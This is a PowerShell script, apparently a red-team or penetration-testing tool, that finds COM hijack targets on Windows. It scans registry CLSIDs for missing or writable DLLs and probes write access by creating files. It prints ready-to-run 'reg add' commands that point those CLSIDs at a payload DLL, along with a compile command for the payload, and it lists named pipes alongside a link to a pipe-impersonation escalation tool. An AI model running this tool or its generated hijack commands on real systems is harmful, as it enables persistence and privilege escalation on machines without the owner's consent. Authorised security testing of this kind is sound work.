<#
.SYNOPSIS
    Find COM hijack opportunities for a target application.

.DESCRIPTION
    Identifies COM CLSIDs that:
    1. Are loaded by the target application (via procmon)
    2. Exist only in HKLM (can be hijacked via HKCU)
    3. Point to missing DLLs (phantom COM objects)

    MITRE ATT&CK: T1546.015

.PARAMETER ProcessName
    Target process to monitor

.EXAMPLE
    .\find_com_targets.ps1 -ProcessName "TargetApp"
#>

param(
    [string]$ProcessName = ""
)

Write-Host "`n========================================" -ForegroundColor Cyan
Write-Host " COM Hijack Target Finder" -ForegroundColor Cyan
Write-Host "========================================`n" -ForegroundColor Cyan

# ============================================================
# Method 1: Find CLSIDs in HKLM without HKCU override
# ============================================================
Write-Host "--- CLSIDs in HKLM without HKCU override ---" -ForegroundColor Yellow
Write-Host "[*] These can be hijacked by creating HKCU\Software\Classes\CLSID\{...}`n"

$hklmClsids = Get-ChildItem "HKLM:\Software\Classes\CLSID" -ErrorAction SilentlyContinue | Select-Object -First 500
$hijackable = @()

foreach ($clsid in $hklmClsids) {
    $clsidName = $clsid.PSChildName
    $hkcuPath = "HKCU:\Software\Classes\CLSID\$clsidName"

    # Skip if already in HKCU
    if (Test-Path $hkcuPath) { continue }

    # Check InprocServer32 (DLL path)
    $inprocPath = Join-Path $clsid.PSPath "InprocServer32"
    if (-not (Test-Path $inprocPath)) { continue }

    $dllPath = (Get-ItemProperty $inprocPath -ErrorAction SilentlyContinue).'(default)'
    if (-not $dllPath) { continue }

    # Expand environment variables
    $dllPath = [System.Environment]::ExpandEnvironmentVariables($dllPath)

    # Skip system DLLs (less interesting)
    if ($dllPath -match "^C:\\Windows\\System32\\" -or $dllPath -match "^C:\\Windows\\SysWOW64\\") { continue }

    $displayName = (Get-ItemProperty $clsid.PSPath -ErrorAction SilentlyContinue).'(default)'

    # Check if DLL exists
    $dllExists = Test-Path $dllPath

    if (-not $dllExists) {
        Write-Host "[!!!] PHANTOM COM OBJECT:" -ForegroundColor Red
        Write-Host "      CLSID: $clsidName"
        Write-Host "      Name: $displayName"
        Write-Host "      DLL: $dllPath (MISSING)"
        Write-Host "      -> Place payload DLL at this path or hijack via HKCU`n"
        $hijackable += @{CLSID=$clsidName; DLL=$dllPath; Name=$displayName; Type="Phantom"}
    } else {
        # Check if DLL directory is writable
        $dllDir = Split-Path $dllPath -Parent
        $testFile = Join-Path $dllDir ".vapt_test_$(Get-Random)"
        try {
            [System.IO.File]::WriteAllText($testFile, "test")
            Remove-Item $testFile -Force
            Write-Host "[!] WRITABLE COM DLL:" -ForegroundColor Yellow
            Write-Host "    CLSID: $clsidName"
            Write-Host "    DLL: $dllPath"
            Write-Host "    -> Replace DLL or hijack via HKCU`n"
            $hijackable += @{CLSID=$clsidName; DLL=$dllPath; Name=$displayName; Type="Writable"}
        } catch {}
    }
}

# ============================================================
# Method 2: Procmon instructions for runtime discovery
# ============================================================
Write-Host "--- Process Monitor Method (most accurate) ---" -ForegroundColor Yellow
Write-Host @"
1. Launch procmon64.exe
2. Set filters:
   - Operation  | is      | RegOpenKey
   - Path       | contains | InprocServer32
   $(if ($ProcessName) { "- Process Name | is | $ProcessName.exe" })
   - Result     | is      | NAME NOT FOUND
3. Launch the target application
4. Look for CLSID lookups in HKCU that fall through to HKLM
5. Those CLSIDs are hijackable via HKCU

"@

# ============================================================
# Method 3: Generate hijack commands
# ============================================================
if ($hijackable.Count -gt 0) {
    Write-Host "--- Hijack Commands ---" -ForegroundColor Yellow

    foreach ($h in $hijackable) {
        Write-Host "# CLSID: $($h.CLSID) ($($h.Name))"
        Write-Host "# Original DLL: $($h.DLL)"
        Write-Host @"
reg add "HKCU\Software\Classes\CLSID\$($h.CLSID)\InprocServer32" /ve /d "C:\payloads\com-hijack\payload.dll" /f
reg add "HKCU\Software\Classes\CLSID\$($h.CLSID)\InprocServer32" /v ThreadingModel /d "Both" /f

"@
    }

    Write-Host "[*] Found $($hijackable.Count) hijackable CLSIDs" -ForegroundColor Green
    Write-Host "[*] Compile payload: x86_64-w64-mingw32-gcc -shared -o payload.dll com_hijack_template.c -lole32"
} else {
    Write-Host "[*] No obvious targets found. Use procmon for runtime analysis." -ForegroundColor Yellow
}

# ============================================================
# Named Pipe Enumeration (bonus)
# ============================================================
Write-Host "`n--- Named Pipes (IPC Attack Surface) ---" -ForegroundColor Yellow

$pipes = [System.IO.Directory]::GetFiles("\\.\pipe\") | ForEach-Object {
    $_.Replace("\\.\pipe\", "")
}

if ($ProcessName) {
    Write-Host "[*] All named pipes (filter for $ProcessName manually):"
} else {
    Write-Host "[*] Named pipes on this system:"
}

$pipes | Where-Object { $_ -notmatch "^(ANONYMOUS|wkssvc|lsass|ntsvcs|srvsvc)" } |
    Select-Object -First 30 | ForEach-Object {
    Write-Host "    \\.\pipe\$_"
}

Write-Host "`n[*] Test pipe permissions with: pipelist.exe (Sysinternals) or accesschk.exe"
Write-Host "[*] Impersonate via pipe: https://github.com/BeichenDream/GodPotato"
